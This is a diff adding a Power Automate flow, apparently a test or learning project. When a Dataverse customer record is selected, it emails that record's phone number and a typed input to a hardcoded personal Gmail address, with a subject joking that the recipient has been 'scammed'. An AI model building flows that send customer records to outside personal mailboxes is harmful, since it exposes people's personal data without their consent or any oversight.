@@ -1,0 +1,127 @@
+{
+  "properties": {
+    "connectionReferences": {
+      "shared_commondataserviceforapps": {
+        "impersonation": {},
+        "runtimeSource": "embedded",
+        "connection": {
+          "connectionReferenceLogicalName": "cre97_sharedcommondataserviceforapps_5bdb0"
+        },
+        "api": {
+          "name": "shared_commondataserviceforapps"
+        }
+      },
+      "shared_gmail-1": {
+        "runtimeSource": "invoker",
+        "connection": {
+          "connectionReferenceLogicalName": "cre97_sharedgmail_0468c"
+        },
+        "api": {
+          "name": "shared_gmail"
+        }
+      }
+    },
+    "definition": {
+      "$schema": "https://schema.management.azure.com/providers/Microsoft.Logic/schemas/2016-06-01/workflowdefinition.json#",
+      "contentVersion": "1.0.0.0",
+      "parameters": {
+        "$authentication": {
+          "defaultValue": {},
+          "type": "SecureObject"
+        },
+        "$connections": {
+          "defaultValue": {},
+          "type": "Object"
+        },
+        "dynamicscrmonline.entityName": {
+          "defaultValue": "",
+          "type": "String"
+        }
+      },
+      "triggers": {
+        "manual": {
+          "splitOn": "@triggerBody()['rows']",
+          "type": "Request",
+          "kind": "ApiConnection",
+          "inputs": {
+            "operationId": "RecordSelected",
+            "parameters": {
+              "entityName": "cre97_customers"
+            },
+            "schema": {
+              "type": "object",
+              "properties": {
+                "rows": {
+                  "type": "array",
+                  "items": {
+                    "type": "object",
+                    "properties": {
+                      "text": {
+                        "description": "Please enter your input",
+                        "title": "Please sir",
+                        "type": "string",
+                        "x-ms-content-hint": "TEXT",
+                        "x-ms-dynamically-added": true
+                      },
+                      "entity": {
+                        "properties": {
+                          "cre97_phone": {
+                            "title": "Phone",
+                            "type": "string"
+                          }
+                        },
+                        "type": "object",
+                        "required": []
+                      }
+                    }
+                  }
+                }
+              },
+              "required": [
+                "rows"
+              ]
+            },
+            "host": {
+              "connection": {
+                "name": "@parameters('$connections')['shared_commondataserviceforapps']['connectionId']"
+              }
+            }
+          }
+        }
+      },
+      "actions": {
+        "Send_email_(V2)": {
+          "runAfter": {
+            "Compose": [
+              "Succeeded"
+            ]
+          },
+          "type": "OpenApiConnection",
+          "inputs": {
+            "parameters": {
+              "emailMessage/To": "trangdan106@gmail.com",
+              "emailMessage/Subject": "Yolo - you have been scammed by PLS SIR",
+              "emailMessage/Body": "<p class=\"editor-paragraph\">yolo this is the record row phone value: @{triggerBody()?['entity']?['cre97_phone']}.</p><p class=\"editor-paragraph\">This is the input value @{outputs('Compose')}.</p>"
+            },
+            "host": {
+              "apiId": "/providers/Microsoft.PowerApps/apis/shared_gmail",
+              "connectionName": "shared_gmail-1",
+              "operationId": "SendEmailV2"
+            },
+            "authentication": {
+              "value": "@json(decodeBase64(triggerOutputs().headers['X-MS-APIM-Tokens']))['$ConnectionKey']",
+              "type": "Raw"
+            }
+          }
+        },
+        "Compose": {
+          "runAfter": {},
+          "type": "Compose",
+          "inputs": "@triggerBody()?['text']"
+        }
+      }
+    },
+    "templateName": "ab12caeaa14d4fa48730b2ab650aac2a"
+  },
+  "schemaVersion": "1.0.0.0"
+}
